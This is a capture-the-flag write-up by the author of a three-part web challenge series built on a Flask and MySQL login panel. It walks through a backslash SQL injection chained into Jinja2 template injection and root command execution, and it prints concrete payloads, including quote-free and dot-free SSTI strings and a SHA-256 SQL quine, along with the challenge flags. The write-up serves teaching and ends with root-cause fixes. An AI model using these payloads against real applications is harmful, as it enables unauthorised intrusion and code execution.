---
title:  "GMI CTF 2026 - No Slang Series (Web)"
date:   2026-06-23 13:00:00 +0800
categories: [CTF Writeup, Web Exploitation]
tags: [GMI CTF 2026]
---

> This series was created by me for GMI CTF 2026 under the Web category. It was **inspired from** the **"No Quotes"** challenge series by **SteakEnthusiast** (UofTCTF 2026) — it shares the same class of vulnerabilities and exploit chain, wrapped in a new theme (a greenhouse climate console called *Meridian*) with its own routes/fields. Full credit for the original idea goes to him.
{: .prompt-info}

Hello again! This time it's a three-part series — **No Slang**, **No Slang 2**, and **No Slang 3** — all built on the same little Flask login panel. The fun part is that all three share one core chain (a SQL injection that leads to template injection that leads to RCE), and each level then bolts on **one more defence** that you have to creatively bypass. So I'll explain the shared chain once, then we'll climb the difficulty ladder one obstacle at a time.

If you've never done SQLi or SSTI before, this is a really nice series to learn on, because you get to see *why* each defence exists and what breaks it.

## Challenge Description

Three flags, one application that gets progressively meaner.

> Name: No Slang
>
> Category: Web
>
> Difficulty: Easy
>
> Meridian Greenhouse Controls keeps the city's rooftop farms alive — regulating humidity, CO₂, and the lighting cycles from a single climate console. After one too many mishaps from operators fat-fingering odd characters into the system, the team slapped a strict "no slang" policy onto the sign-in form and declared the panel secure. You're standing at that login with no account, and the console is waiting on the other side.

> Name: No Slang 2
>
> Category: Web
>
> Difficulty: Medium
>
> Word got around that someone waltzed past the Meridian sign-in, so the greenhouse crew bolted on an extra verification step and reissued every operator's keycode. Management is once again confident the climate console is sealed tight. You're back at the same login, still without an account.

> Name: No Slang 3
>
> Category: Web
>
> Difficulty: Hard
>
> Twice burned, the Meridian operators hardened the panel yet again — tighter rules on what you're allowed to type, and keycodes that are never written down in the clear. The head grower insists it's finally bulletproof. The climate console sits behind that login, same as ever.

## 1. The shared chain

Before any of the flags, let's lay out the bones that all three challenges share. The panel is a Flask sign-in form ("Meridian Greenhouse Controls") backed by MySQL. The full attack path is:

```
backslash SQL injection  ->  UNION-controlled session value  ->  SSTI on /console  ->  /readflag (SUID root)  ->  flag
```

Let's take it piece by piece.

### The "no slang" filter

Trying a classic `' OR 1=1 -- -` returns **"Quotes are not permitted on the panel."** So the WAF (`meridian/screening.py`) blocks single and double quotes — `'` and `"`. That's the whole "no slang" gimmick. Nothing else is filtered (yet).

### Backslash breaks the chain

The sign-in query (`meridian/storage.py`) is built with a raw f-string:

```sql
SELECT id, operator FROM operators WHERE operator = ('{operator}') AND keycode = ('{keycode}')
```

We can't use quotes, but a **backslash** is fair game. Submitting `operator = \` produces:

```sql
... WHERE operator = ('\') AND keycode = ('<our SQL>')
```

See what happened? The `\` escapes the operator literal's *closing* quote, so the database keeps reading the string — `') AND keycode = ('` all becomes part of the "operator" value — until it hits the next real quote. That means our **`keycode` field is now parsed as raw SQL**. The quote filter is defeated not by sneaking a quote in, but by *removing* one the app expected to be there.

> This is my favourite kind of bug to teach. The developer's quotes are still in the query string; we just escaped one so the parser's idea of "where the string ends" no longer matches the developer's idea. Everything downstream falls out of that single mismatch.
{: .prompt-info }

### The sink — SSTI on the console

After login, `meridian/views.py:console` greets the operator like so:

```python
render_template_string(CONSOLE_TEMPLATE.read_text() % session["operator"])
```
{: file="meridian/views.py" }

The `%` operator splices the operator name into the template **before** Jinja2 renders it. So if we control `session["operator"]`, we control a Jinja2 template string — that's **Server-Side Template Injection**. And `session["operator"]` is just `row[1]` from our login query, which we control through a `UNION SELECT`. From SSTI it's a short hop to RCE: a SUID-root `/readflag` binary (compiled from `readflag.c`) does `setuid(0)` then `cat /root/flag.txt`, so we just need our template payload to run it.

That's the skeleton. Every flag below is "make this exact chain survive one more defence."

## 2. Flag 1 — No Slang (the backslash)

The Easy level has nothing but the quote filter, so the shared chain works as-is. Since quotes are banned inside `keycode` too, we encode the SSTI string with MySQL's `CHAR()` so no literal quotes ever appear:

```jinja2
{{lipsum.__globals__.os.popen('/readflag').read()}}
```

Final inputs:

- **operator**: `\`
- **keycode**: `) UNION SELECT 1, CHAR(123,123,108,...) ;-- -`

The `UNION SELECT 1, CHAR(...)` returns a fake row whose second column (the operator name) is our SSTI payload, which gets stored in the session. Then:

1. `POST /signin` with the inputs above → the session operator is now the SSTI payload.
2. `GET /console` → the `%` splice + `render_template_string` evaluate the payload, run `/readflag` (SUID root), and the flag appears on the page.

```bash
python3 solve/solve.py http://127.0.0.1:5000
```

→ **Flag 1** → `HYNX{b4cKsL4sH_br34Ks_7h3_Ch41n}`

## 3. Flag 2 — No Slang 2 (quote the query with itself)

Now the greenhouse crew adds a **credential double-check**. After the lookup, `meridian/views.py` enforces:

```python
if operator != row[0] or keycode != row[1]:
    return _reject("Sign-in failed.")
```
{: file="meridian/views.py" }

This breaks the Flag 1 trick. Our UNION can no longer just *invent* values — `row[0]` and `row[1]` now have to equal the **exact** strings we submitted as `operator` and `keycode`. But we needed `row[1]` (the operator column) to be our SSTI payload, which is obviously not what we type into the operator field... so how can the returned row match the submission AND carry a payload?

The trick is to **quote the running query with itself**. `information_schema.processlist.INFO` holds the SQL text currently executing on our connection — and that text *contains* our submitted operator and keycode as literals. So we can extract them straight back out of the live query using nested `SUBSTRING_INDEX`:

```sql
SUBSTRING_INDEX(SUBSTRING_INDEX(INFO, CHAR(...'operator = (\''...), -1), CHAR(...'\')'...), 1)
```

(the prefix/suffix markers are `CHAR()`-encoded because quotes are still banned). We do the same to carve out the keycode. The UNION then returns exactly `(submitted_operator, submitted_keycode)` — so the double-check passes — while the operator value we submitted is itself the SSTI payload that lands in the session.

The key move: we put the payload into the **operator field** this time, with a trailing `\` to escape the literal, and make the SSTI read its command from a request arg so it stays quote-free:

- **operator**: `{{lipsum.__globals__.os.popen(request.args.rce).read()}}\`
- **keycode**:
  ```sql
  ) UNION SELECT <extract operator>, <extract keycode>
    FROM information_schema.processlist WHERE ID=connection_id();-- -
  ```

Then:

1. `POST /signin` → the double-check passes, SSTI payload is in the session.
2. `GET /console?rce=/readflag` → SSTI evaluates, runs `/readflag`, flag is on the page.

→ **Flag 2** → `HYNX{1nF0_sCh3m4_l34Ks_3v3RyTh1nG}`

> A self-referential SQL statement that reads its own text out of `processlist` feels illegal the first time you see it, but it's a genuinely clean way to satisfy "return exactly what I sent you" without knowing it in advance. The query literally quotes itself.
{: .prompt-tip }

## 4. Flag 3 — No Slang 3 (hash quine + dotless SSTI)

The Hard level piles on **two** more obstacles at once.

**Obstacle 1 — the keycode is SHA-256 hashed.** The query is now `... AND keycode = (SHA2('{keycode}', 256))`, and `/signin` checks `sha256(submitted_keycode) == row[1]`. So the UNION's keycode column has to equal `SHA256(submitted_keycode)` — we can't just echo a constant back like in Flag 2, because we'd need to know the hash of a string that contains that very hash.

The answer is a **SQL quine** — a statement that can reproduce its own SHA-256 from itself:

```sql
) UNION SELECT 0x<operator_hex>,
  SHA2(REPLACE(s, CHAR(36), HEX(s)), 256)
  FROM (SELECT 0x<template_hex> AS s) AS t -- 
```

Here `s` is the template bytes, `CHAR(36)` is `$`, and `HEX(s)` is the template's own hex. `REPLACE` swaps the single `$` placeholder in the template for its own hex, **rebuilding the exact string we submitted** as the keycode. So `SHA2(rebuilt) == SHA256(submitted_keycode)` and the double-check passes. Meanwhile the operator column returns `0x<operator_hex>`, which decodes straight back to the payload.

**Obstacle 2 — the period is now blocked too.** The WAF added `.` to the blacklist, which kills standard dotted Jinja2 attribute access like `lipsum.__globals__.os.popen(...)`. We rebuild the whole payload without a single dot, using filters:

- attribute access → `|attr(dict(__globals__=x)|join)`
- item access → `[dict(os=x)|join]`
- the `/readflag` string → `chr(47) ~ "readflag"` (47 is `/`)

No `.`, no `'`, no `"` ever reach the form — and because the payload is hex-encoded into the operator column via `0x<operator_hex>`, the filter never even sees it.

Inputs:

- **operator**: `<dotless SSTI>\` (trailing `\` escapes the operator literal)
- **keycode**: the quine above (all hex / `CHAR()` — no quotes, no periods)

Then:

1. `POST /signin` → the quine satisfies the SHA-256 double-check; SSTI payload lands in the session.
2. `GET /console` → the dotless SSTI evaluates, runs `/readflag`, flag is on the page.

→ **Flag 3** → `HYNX{h4sH_qU1n3_m4sT3rY_unL0cK3d}`

## 5. The difficulty ladder, at a glance

| Level | Filter | Credential check | Hashing | Key technique |
|-------|--------|------------------|---------|---------------|
| No Slang   | `'` `"`       | None                  | None             | backslash SQLi + UNION + `CHAR()` |
| No Slang 2 | `'` `"`       | Python double-check   | None             | `information_schema.processlist` self-reference |
| No Slang 3 | `'` `"` `.`   | Python double-check   | SHA-256 (SQL + Py) | SQL quine + dotless SSTI via `\|attr()` |

## Conclusion

What I love about this set is how each defence is the *natural* fix a developer would reach for after getting burned — block quotes, then double-check the row, then hash the secret, then block dots — and yet every single one of them has an escape hatch if the underlying f-string injection and template injection are still there. The lesson is that patching symptoms one by one never closes the actual hole; you have to fix the root (parameterised queries, no `render_template_string` on user data).

Big credit again to **SteakEnthusiast** for the original "No Quotes" series that inspired this one; rebuilding it as the Meridian greenhouse panel was a really fun way to study the chain. Hope you picked up a SQLi or SSTI trick or two today. Till the next one, ciao!
